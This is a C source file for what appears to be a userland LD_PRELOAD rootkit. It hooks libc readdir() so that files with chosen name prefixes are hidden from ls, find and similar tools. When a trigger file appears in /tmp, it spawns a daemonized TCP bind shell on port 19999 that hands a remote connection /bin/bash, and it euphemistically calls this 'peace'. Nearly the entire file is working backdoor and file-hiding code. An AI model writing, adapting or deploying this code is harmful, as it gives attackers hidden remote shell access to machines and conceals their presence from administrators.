/*
* Author: Abhinav Thakur
* Email : compilepeace@gmail.com
* Description: A shared object that hooks libc readdir() to conditionally execute some peaceful 
*              intentions and hide its presence (and practically all the files whose name starts with 
*              the HIDE_FILE macro defined below) from programs like /bin/ls, /usr/bin/find and 
*              basically every program using readdir() to parse filesystem.
*
* However, the peaceful intentions are only triggered if - 
*	-> There is SIGNATURE file present in /tmp directory.
*/


#define _GNU_SOURCE

#include <dlfcn.h>
#include <unistd.h>
#include <stdlib.h>
#include <string.h>
#include <stdio.h>
#include <dirent.h>
#include <sys/socket.h>
#include <sys/types.h>
#include <netinet/in.h>
#include <arpa/inet.h>
#include <unistd.h>

#include <errno.h>


#define HIDE_FILE  "evil_rabbit"
#define SIGNATURE  "snow_valley"
#define PORT       19999


static struct dirent* (*original_readdir)(DIR *dirp) = NULL;
static int PEACE_FLAG = 0;


// Returns 1 if the a process listens on PORT and 0 otherwise. It results into termination of server
// process if it is able to establish a connection with the server process.
int closeExistingConnection()
{
	int client_sockfd = socket(AF_INET, SOCK_STREAM, 0);
	struct sockaddr_in hostConfig;

	// Clearing out hostConfig structure and adding server configuration.
	memset(&hostConfig, 0, sizeof(struct sockaddr_in));
	hostConfig.sin_family = AF_INET;
	hostConfig.sin_port = htons(PORT);
	hostConfig.sin_addr.s_addr = inet_addr("127.0.0.1");

	// Connect to server (localhost:PORT)
	int val = connect(client_sockfd, (struct sockaddr *) &hostConfig, sizeof(hostConfig));
	if (val == 0){
		close(client_sockfd);
		return 1;
	}
	else	return 0;
}


// Create a TCP Bind shell
// 1. Create a socket
// 2. Bind the socket (Assigning a name to socket)
// 3. Start listening
// 4. Accept a connection
// 5. Duplicate STDIN, STDOUT and STDERR file desciptors to the new accepted connection
// 6. Launch a shell. 
//
void peace()
{
	pid_t pid = fork();

	if (pid < 0) return;

	if (pid == 0)
	{
		// Close existing connection and wait for 2 seconds to prevent bind errors
		int status = closeExistingConnection();
		sleep(2);

		// Daemonize the TCP bind shell
		daemon(0,1);

		struct sockaddr_in socketConfig;
		socketConfig.sin_family = AF_INET;
		socketConfig.sin_port   = htons(PORT);
		socketConfig.sin_addr.s_addr = INADDR_ANY;

		int sockfd = socket(AF_INET, SOCK_STREAM, 0);		// <1>
		if (sockfd == -1) return;

		status = bind(sockfd, (struct sockaddr *) &socketConfig, sizeof(socketConfig));		// <2>
		if (status == -1) return;
		
		status = listen(sockfd, 0);			// <3>
		if (status == -1) return;

		int conn_sockfd = accept(sockfd, NULL, NULL);		// <4>
		if (conn_sockfd == -1) return;

		dup2(conn_sockfd, 0);	// <5> : duplicating STDIN
		dup2(conn_sockfd, 1);	// <5> : duplicating STDOUT
		dup2(conn_sockfd, 2);	// <5> : duplicating STDERR

		execve("/bin/bash", NULL, NULL);	// <6>
	}

	return;	
}



// Find the address of a symbol starting from our preloaded SO (malicious.so)
void *findSymbolAddress(char *symbol)
{
	void *address = dlsym(RTLD_NEXT, symbol);
	if (address == NULL) {
		//fprintf(stderr, "[-] (%s) Cannot find symbol address: %s\n", __FUNCTION__, symbol);
		exit(0x10);
	}

	return address;
}


// The  readdir() function returns a pointer to a dirent structure representing the next directory 
// entry in the directory stream pointed to by dirp.  It returns NULL on reaching the  end
// of the directory stream or if an error occurred.
struct dirent *readdir(DIR *dirp)
{

	// Get the address of original readdir() (present in libc)
	if (original_readdir == NULL)
        original_readdir = (struct dirent* (*)(DIR *))findSymbolAddress("readdir");


	{
		// PARSE the /tmp directory point
		// 1. Open up another directory stream to the "/tmp" directory.
		// 2. Search for a dirent present by the name of SIGNATURE in "/tmp" (only if PEACE_FLAG is not set),
		// 3. Call the peace() if "/tmp/SIGNATURE" is found.
		// 4. Set the PEACE_FLAG to 1.
		//
		DIR *chk_dirptr = opendir("/tmp/");			// <1>
		struct dirent *ent_ptr = NULL;

		while ( (ent_ptr = original_readdir(chk_dirptr)) != NULL && PEACE_FLAG == 0)		// <2>
		{
			if ( !strncmp(ent_ptr->d_name, SIGNATURE, strlen(SIGNATURE)) )
			{
				peace();			// <3>
				PEACE_FLAG = 1;		// <4>
				break;
			}
		}
	}

	
	struct dirent *dp = original_readdir(dirp);

	// Skip the directory entry whose d_name starts with (HIDE_FILE OR SIGNATURE) macro
	// (by reading another direntry)
	while ( dp != NULL && 
            ( !strncmp(dp->d_name, HIDE_FILE, strlen(HIDE_FILE)) || 
              !strncmp(dp->d_name, SIGNATURE, strlen(SIGNATURE)) )
		  ){
		dp = original_readdir(dirp);
	}

	return dp;
}

